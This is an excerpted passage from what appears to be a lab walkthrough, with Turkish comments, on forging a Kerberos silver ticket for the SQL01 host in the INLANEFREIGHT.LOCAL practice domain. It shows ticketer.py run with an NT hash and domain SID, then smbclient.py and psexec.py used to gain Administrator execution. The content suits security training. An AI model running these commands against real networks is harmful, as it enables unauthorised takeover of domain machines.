...
```shell
my@attack:~$ echo "10.129.193.81 inlanefreight.local dc01.inlanefreight.local sql01.inlanefreight.local" | sudo tee -a /etc/hosts
```
...
!!! warning
    ...
    SQL01 servis hesabı daha önceden ele geçirildi.

```shell
my@attack:~$ ticketer.py Administrator -nthash 542780725DF68D3456A0672F59001987 -domain INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-1870146311-1183348186-593267556 -spn cifs/SQL01.INLANEFREIGHT.LOCAL
```
...
my@attack:~$ smbclient.py SQL01.INLANEFREIGHT.LOCAL -k -no-pass
```
...
```shell
my@attack:~$ export KRB5CCNAME='Administrator.ccache'
my@attack:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'Administrator'@SQL01.INLANEFREIGHT.LOCAL -k -no-pass -debug
```
